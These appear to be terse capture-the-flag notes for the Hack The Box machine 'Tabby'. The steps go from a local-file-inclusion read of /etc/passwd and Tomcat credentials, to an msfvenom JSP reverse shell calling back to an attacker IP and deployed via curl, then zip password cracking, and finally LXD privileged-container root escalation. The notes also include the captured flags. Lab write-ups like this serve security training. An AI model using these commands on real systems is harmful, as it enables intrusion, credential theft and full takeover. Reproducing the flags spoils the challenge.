# Tabby

```
export_ip = 10.10.10.194

1.Recon

[LFI POINT]
http://10.10.10.194:80/news.php?file=../../../../etc/passwd 

[FUZZ] URL
/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
-> username="tomcat" password="$3cureP4s5w0rd123!"

[Reverse Shell Generate]
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.127 LPORT=4444 -f war > revshell.war

[Deploy Reverse Shell]
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T revshell.war http://10.10.10.194:8080/manager/text/deploy?path=/revshell.war

curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/revShell/

[fcrackzip]

fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 16162020_backup.zip 
possible pw found: admin@it ()

user.txt : 7e8d8aa2ce4d2fdf1ba7933d4033cbdb


[Prev]

-alpine
1. lxc image import ./alpine-v3.12-x86_64-20200918_1400.tar.gz --alias {name}
2. lxc image list
3. lxc init {name}
4. lxc init {name} {name2} -c security.privileged=true
5. lxc config device add {name2} mydevice disk source=/ path=/mnt/root recursive=true
6. lxc start tabbyimage
7. lxc exec tabbyimage /bin/sh

- root folder
cd /mnt/root/root
root.txt c63c8215dec498297c13564edef792e5
```